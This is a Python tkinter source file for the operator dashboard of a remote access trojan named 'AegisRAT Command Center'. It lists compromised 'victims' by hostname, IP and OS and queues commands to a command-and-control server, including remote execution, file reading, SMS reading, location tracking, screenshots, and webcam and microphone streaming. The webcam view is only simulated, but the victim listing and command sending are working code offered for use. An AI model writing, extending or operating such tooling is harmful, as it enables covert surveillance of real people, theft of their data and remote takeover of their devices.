import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import requests
import threading
import time
import json
import websockets
import asyncio
import base64

C2_URL = "http://127.0.0.1:5000"
WS_URL = "ws://127.0.0.1:5000"
SECRET_TOKEN = "AEGIS_SECRET_TOKEN_123"

class AegisDashboard:
    def __init__(self, root):
        self.root = root
        self.root.title("AegisRAT Command Center")
        self.root.geometry("1200x800")
        
        # Tabs
        self.notebook = ttk.Notebook(root)
        self.tab_victims = ttk.Frame(self.notebook)
        self.tab_commands = ttk.Frame(self.notebook)
        self.tab_logs = ttk.Frame(self.notebook)
        self.tab_stream = ttk.Frame(self.notebook)
        
        self.notebook.add(self.tab_victims, text="Victims")
        self.notebook.add(self.tab_commands, text="Commands")
        self.notebook.add(self.tab_logs, text="Live Logs")
        self.notebook.add(self.tab_stream, text="Live Stream")
        self.notebook.pack(expand=True, fill="both", padx=10, pady=10)
        
        self._build_victims_tab()
        self._build_commands_tab()
        self._build_logs_tab()
        self._build_stream_tab()
        
        # Auto-refresh
        self.refresh_victims()
        self.auto_refresh()

    def _get_headers(self):
        return {"X-Aegis-Token": SECRET_TOKEN}

    def _build_victims_tab(self):
        ttk.Label(self.tab_victims, text="Active Victims", font=("Helvetica", 12, "bold")).pack(pady=5)
        
        cols = ('id', 'hostname', 'ip', 'os', 'last_seen', 'status')
        self.tree = ttk.Treeview(self.tab_victims, columns=cols, show='headings', height=15)
        
        for col in cols:
            self.tree.heading(col, text=col.capitalize())
            self.tree.column(col, width=150)
            
        self.tree.pack(expand=True, fill="both", padx=10, pady=10)
        
        self.selected_victim = tk.StringVar()
        self.tree.bind("<<TreeviewSelect>>", lambda e: self._on_select())

    def _build_commands_tab(self):
        ttk.Label(self.tab_commands, text="Send Command", font=("Helvetica", 12, "bold")).pack(pady=5)
        
        frame = ttk.Frame(self.tab_commands)
        frame.pack(pady=10, padx=10)
        
        ttk.Label(frame, text="Action:").grid(row=0, column=0, sticky='w')
        self.action_var = tk.StringVar(value="file_list")
        actions = ['file_list', 'file_read', 'execute', 'sms_read', 'location', 'screenshot', 'webcam_stream', 'mic_stream']
        ttk.Combobox(frame, textvariable=self.action_var, values=actions, width=30).grid(row=0, column=1, padx=5)
        
        ttk.Label(frame, text="Args (JSON):").grid(row=1, column=0, sticky='w')
        self.args_entry = tk.Text(frame, width=50, height=5)
        self.args_entry.grid(row=1, column=1, padx=5, pady=5)
        self.args_entry.insert(1.0, '{"path": "/sdcard"}')
        
        ttk.Button(frame, text="Send Command", command=self.send_command).grid(row=2, column=0, columnspan=2, pady=10)
        
        self.status_label = ttk.Label(frame, text="Ready")
        self.status_label.grid(row=3, column=0, columnspan=2)

    def _build_logs_tab(self):
        self.log_text = scrolledtext.ScrolledText(self.tab_logs, height=20)
        self.log_text.pack(expand=True, fill="both", padx=10, pady=10)
        ttk.Button(self.tab_logs, text="Refresh Logs", command=self.refresh_logs).pack(pady=5)

    def _build_stream_tab(self):
        ttk.Label(self.tab_stream, text="Live Webcam Stream", font=("Helvetica", 12, "bold")).pack(pady=5)
        
        self.stream_frame = ttk.Frame(self.tab_stream)
        self.stream_frame.pack(expand=True, fill="both", padx=10, pady=10)
        
        self.stream_status = ttk.Label(self.stream_frame, text="Disconnected")
        self.stream_status.pack(pady=5)
        
        ttk.Button(self.stream_frame, text="Start Stream", command=self.start_stream).pack(side=tk.LEFT, padx=5)
        ttk.Button(self.stream_frame, text="Stop Stream", command=self.stop_stream).pack(side=tk.LEFT, padx=5)
        
        # Placeholder for video rendering (in a real app, use OpenCV or a Web View)
        self.video_placeholder = tk.Label(self.stream_frame, text="[ Video Stream Area ]", font=("Helvetica", 20), bg="black", fg="white", width=50, height=20)
        self.video_placeholder.pack(expand=True, fill="both", pady=10)

    def _on_select(self):
        selection = self.tree.selection()
        if selection:
            item = self.tree.item(selection[0])
            self.selected_victim.set(item['values'][0])

    def refresh_victims(self):
        try:
            resp = requests.get(f"{C2_URL}/api/v1/admin/victims", headers=self._get_headers())
            victims = resp.json()
            for i in self.tree.get_children():
                self.tree.delete(i)
            for v in victims:
                self.tree.insert('', 'end', values=(v['id'], v['hostname'], v['ip'], v['os'], v['last_seen'], v['status']))
        except Exception as e:
            print(f"Refresh Error: {e}")

    def send_command(self):
        victim_id = self.selected_victim.get()
        if not victim_id:
            messagebox.showerror("Error", "Select a victim first.")
            return
            
        action = self.action_var.get()
        try:
            args = json.loads(self.args_entry.get("1.0", tk.END))
        except json.JSONDecodeError:
            messagebox.showerror("Error", "Invalid JSON in Args.")
            return
            
        payload = {
            "victim_id": victim_id,
            "action": action,
            "args": args
        }
        
        try:
            resp = requests.post(f"{C2_URL}/api/v1/admin/queue", json=payload, headers=self._get_headers())
            if resp.status_code == 200:
                self.status_label.config(text=f"Command {resp.json()['id']} queued.")
            else:
                self.status_label.config(text=f"Error: {resp.text}")
        except Exception as e:
            self.status_label.config(text=f"Connection Error: {e}")

    def refresh_logs(self):
        victim_id = self.selected_victim.get()
        if not victim_id:
            messagebox.showerror("Error", "Select a victim first.")
            return
            
        try:
            resp = requests.get(f"{C2_URL}/api/v1/admin/logs?victim_id={victim_id}", headers=self._get_headers())
            logs = resp.json()
            self.log_text.delete(1.0, tk.END)
            for log in logs:
                self.log_text.insert(tk.END, f"[{log['timestamp']}] {log['data']}\n")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to fetch logs: {e}")

    def start_stream(self):
        victim_id = self.selected_victim.get()
        if not victim_id:
            messagebox.showerror("Error", "Select a victim first.")
            return
            
        self.stream_status.config(text="Connecting...")
        # In a real implementation, this would open a WebSocket connection
        # and render the video frames using OpenCV or a Web View
        self.stream_status.config(text="Streaming (Simulated)")
        
        # Simulate receiving frames
        def simulate_stream():
            for i in range(10):
                self.root.after(100, self._update_stream_frame, i)
                time.sleep(0.1)
        
        threading.Thread(target=simulate_stream, daemon=True).start()

    def stop_stream(self):
        self.stream_status.config(text="Disconnected")
        self.video_placeholder.config(text="[ Video Stream Area ]")

    def _update_stream_frame(self, frame_num):
        # In a real implementation, this would decode the H.264 frame and display it
        self.video_placeholder.config(text=f"[ Frame {frame_num} ]")

    def auto_refresh(self):
        self.refresh_victims()
        self.root.after(5000, self.auto_refresh) # Refresh every 5s

if __name__ == "__main__":
    root = tk.Tk()
    app = AegisDashboard(root)
    root.mainloop()
